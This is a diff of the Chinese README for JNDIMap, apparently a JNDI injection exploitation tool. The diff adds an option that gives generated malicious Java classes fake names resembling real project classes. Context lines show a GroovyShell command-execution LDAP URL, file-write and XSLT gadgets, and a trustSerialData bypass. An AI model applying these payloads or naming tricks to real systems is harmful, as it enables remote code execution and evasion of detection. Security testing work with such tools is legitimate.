@@ -5,7 +5,7 @@
 ## Usage
 
 ```bash
-Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-s <ldapsPort>] [-p <httpPort>] [-j <jksPath>] [-k <jksPin>] [-u <url>] [-f <file>] [-useReferenceOnly] [-h]
+Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-s <ldapsPort>] [-p <httpPort>] [-j <jksPath>] [-k <jksPin>] [-u <url>] [-f <file>] [-useReferenceOnly] [-fakeClassName] [-h]
 ````
 
 `-i`: 服务器监听 IP (即 codebase, 必须指定为一个目标可访问到的 IP, 例如 `192.168.1.100`, 不能用 `0.0.0.0`)
@@ -27,6 +27,8 @@ Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-s <ldaps
 `-f`: JS 脚本路径, 用于编写自定义 JNDI Payload
 
 `-useReferenceOnly`: 仅适用于 LDAP 协议, 通过 LDAP 相关参数直接返回 Reference 对象, 用于绕过 `com.sun.jndi.ldap.object.trustSerialData`
+
+`-fakeClassName`: 在生成恶意 Java 类时使用随机虚假类名, 该类名与真实项目高度相似
 
 `-h`: 显示 Usage 信息
 
@@ -121,7 +123,7 @@ ldap://127.0.0.1:1389/GroovyShell/Command/open -a Calculator
 - 任意文件写: `com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename`
 - XSLT 加载: `com.sun.org.apache.xalan.internal.xslt.Process._main`
 
-XSLT payload 部分使用了 Spring 的反射库调用 defineClass, 因此需要依赖 Spring 环境
+XSLT Payload 部分使用了 Spring 的反射库调用 defineClass, 因此需要依赖 Spring 环境
 
 ```bash
 # XStream Bypass (依赖 Spring)
@@ -547,3 +549,15 @@ public void processSearchResult(InMemoryInterceptedSearchResult searchResult) {
 ```bash
 java -jar JNDIMap.jar -useReferenceOnly
 ```
+
+## fakeClassName
+
+JNDIMap 的 [classNames](src/main/resources/classNames) 目录中包含了一些与真实项目高度相似的虚假类名, 这些类名基于 [ClassNameObfuscator](https://github.com/X1r0z/ClassNameObfuscator) 项目生成, 可用于 JNDI 注入中生成恶意 Java 类的相关场景
+
+使用时指定 `-fakeClassName` 参数即可
+
+```bash
+java -jar JNDIMap.jar -fakeClassName
+```
+
+当未指定 `-fakeClassName` 参数时, JNDIMap 会生成符合 `[A-Z]{1}[A-Za-z0-9]{7}` 格式的随机字符串作为恶意类的类名
